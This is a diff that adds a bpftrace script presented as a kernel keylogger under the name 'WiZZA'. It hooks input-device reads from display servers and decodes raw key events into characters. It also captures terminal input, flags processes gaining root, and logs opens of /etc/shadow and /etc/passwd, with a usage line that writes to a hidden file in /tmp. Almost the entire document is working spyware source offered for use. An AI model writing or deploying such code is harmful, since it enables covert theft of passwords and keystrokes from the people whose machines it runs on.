@@ -1,0 +1,131 @@
+#!/usr/bin/env bpftrace
+/*
+ * WiZZA eBPF Kernel Keylogger
+ * Hooks sys_read on /dev/input/* to capture raw key events
+ * Also hooks sys_write on terminals (fd 1/2) for output capture
+ *
+ * Requires: bpftrace, root, kernel >= 4.9
+ * Usage: bpftrace ebpf_keylog.bt [logfile]
+ *        bpftrace ebpf_keylog.bt | tee /tmp/.wizza_keys.log
+ *
+ * Key event decoding:
+ *   struct input_event { timeval time; __u16 type; __u16 code; __s32 value }
+ *   type=1 (EV_KEY), value=1 (press), value=0 (release)
+ *   code = linux keycode (KEY_A=30, KEY_ENTER=28, etc.)
+ */
+
+/* ── Key code → char map ─────────────────────────────────────────────── */
+BEGIN {
+    printf("WiZZA eBPF Keylogger — PID: %d\n", pid);
+    printf("Attaching to /dev/input devices + terminal writes\n");
+    printf("Press Ctrl+C to stop\n\n");
+
+    /* map keycode → printable char (lowercase, no shift) */
+    @km[1]="ESC";   @km[2]="1"; @km[3]="2"; @km[4]="3"; @km[5]="4";
+    @km[6]="5";     @km[7]="6"; @km[8]="7"; @km[9]="8"; @km[10]="9";
+    @km[11]="0";    @km[12]="-"; @km[13]="="; @km[14]="BS";
+    @km[15]="TAB";  @km[16]="q"; @km[17]="w"; @km[18]="e"; @km[19]="r";
+    @km[20]="t";    @km[21]="y"; @km[22]="u"; @km[23]="i"; @km[24]="o";
+    @km[25]="p";    @km[26]="["; @km[27]="]"; @km[28]="RET"; @km[29]="CTRL";
+    @km[30]="a";    @km[31]="s"; @km[32]="d"; @km[33]="f"; @km[34]="g";
+    @km[35]="h";    @km[36]="j"; @km[37]="k"; @km[38]="l"; @km[39]=";";
+    @km[40]="'";    @km[41]="`"; @km[42]="LSHIFT"; @km[43]="\\";
+    @km[44]="z";    @km[45]="x"; @km[46]="c"; @km[47]="v"; @km[48]="b";
+    @km[49]="n";    @km[50]="m"; @km[51]=","; @km[52]="."; @km[53]="/";
+    @km[54]="RSHIFT"; @km[55]="*"; @km[56]="ALT"; @km[57]=" ";
+    @km[58]="CAPS"; @km[59]="F1"; @km[60]="F2"; @km[61]="F3"; @km[62]="F4";
+    @km[105]="LEFT"; @km[106]="RIGHT"; @km[103]="UP"; @km[108]="DOWN";
+    @km[111]="DEL"; @km[110]="INS";
+}
+
+/* ── Hook sys_read on /dev/input* ────────────────────────────────────── */
+tracepoint:syscalls:sys_enter_read
+/strncmp(comm, "Xorg", 4) == 0 ||
+ strncmp(comm, "xorg", 4) == 0 ||
+ strncmp(comm, "weston",6) == 0 ||
+ strncmp(comm, "evtest",6) == 0/
+{
+    @read_buf[tid] = args->buf;
+}
+
+tracepoint:syscalls:sys_exit_read
+/@read_buf[tid] != 0 && args->ret == 24/
+{
+    /* 24 bytes = sizeof(struct input_event) */
+    $buf = (uint8_t *)@read_buf[tid];
+    $type  = *(uint16_t *)($buf + 16); /* offsetof(input_event, type) */
+    $code  = *(uint16_t *)($buf + 18);
+    $value = *(int32_t  *)($buf + 20);
+
+    /* EV_KEY=1, keypress=1 */
+    if ($type == 1 && $value == 1) {
+        $ch = @km[$code];
+        if ($ch != "") {
+            printf("[KEY] [%s] pid=%d comm=%s  code=%d  key=%s\n",
+                   strftime("%H:%M:%S", nsecs), pid, comm, $code, $ch);
+        } else {
+            printf("[KEY] [%s] pid=%d comm=%s  code=%d  key=?\n",
+                   strftime("%H:%M:%S", nsecs), pid, comm, $code);
+        }
+    }
+    delete(@read_buf[tid]);
+}
+
+/* ── Fallback: hook all /dev/input reads by file path ────────────────── */
+tracepoint:syscalls:sys_enter_read
+{
+    @read_buf2[tid] = args->buf;
+    @read_fd[tid]   = args->fd;
+}
+
+tracepoint:syscalls:sys_exit_read
+/@read_buf2[tid] != 0 && args->ret == 24/
+{
+    /* Check if fd points to /dev/input — read fdpath via /proc */
+    $buf  = (uint8_t *)@read_buf2[tid];
+    $type = *(uint16_t *)($buf + 16);
+    $code = *(uint16_t *)($buf + 18);
+    $val  = *(int32_t  *)($buf + 20);
+
+    if ($type == 1 && $val == 1) {
+        printf("[INPUT] [%s] pid=%-5d %-16s code=%d\n",
+               strftime("%H:%M:%S", nsecs), pid, comm, $code);
+    }
+    delete(@read_buf2[tid]);
+    delete(@read_fd[tid]);
+}
+
+/* ── Hook terminal writes to capture typed commands ─────────────────── */
+tracepoint:syscalls:sys_enter_write
+/args->fd == 0 && args->count > 0 && args->count < 256/
+{
+    printf("[TTY-IN]  [%s] pid=%-5d %-16s → %r\n",
+           strftime("%H:%M:%S", nsecs), pid, comm,
+           buf(args->buf, args->count));
+}
+
+/* ── Hook process credentials (useful for privilege changes) ─────────── */
+kprobe:commit_creds
+{
+    $cred = (struct cred *)arg0;
+    if ($cred->uid.val == 0) {
+        printf("[ROOT]  [%s] pid=%-5d %-16s gained uid=0!\n",
+               strftime("%H:%M:%S", nsecs), pid, comm);
+    }
+}
+
+/* ── Credential stuffing: hook PAM auth / shadow reads ──────────────── */
+tracepoint:syscalls:sys_enter_openat
+/strncmp(str(args->filename), "/etc/shadow", 11) == 0 ||
+ strncmp(str(args->filename), "/etc/passwd", 11) == 0/
+{
+    printf("[CRED-FILE] [%s] pid=%-5d %-16s opened %s\n",
+           strftime("%H:%M:%S", nsecs), pid, comm,
+           str(args->filename));
+}
+
+/* ── Cleanup ─────────────────────────────────────────────────────────── */
+END {
+    clear(@km); clear(@read_buf); clear(@read_buf2); clear(@read_fd);
+    printf("\n[*] WiZZA eBPF keylogger stopped.\n");
+}
